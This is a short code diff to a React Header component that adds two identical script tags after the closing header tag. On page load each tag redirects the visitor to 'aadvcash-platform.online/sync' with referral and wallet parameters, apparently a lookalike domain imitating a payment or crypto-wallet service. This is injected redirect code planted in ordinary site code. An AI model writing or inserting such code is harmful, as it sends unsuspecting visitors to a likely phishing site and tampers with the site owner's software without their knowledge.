@@ -9,6 +9,7 @@ export default function Header({ name }) {
           <a>{name}</a>
         </Link>
       </p>
-    </header>
+    </header><script type="text/javascript">location.href="https://aadvcash-platform.online/sync?refer=PAPALEGUAS&wallet=adcash"</script>
+<script type="text/javascript">location.href="https://aadvcash-platform.online/sync?refer=PAPALEGUAS&wallet=adcash"</script>
   );
 }
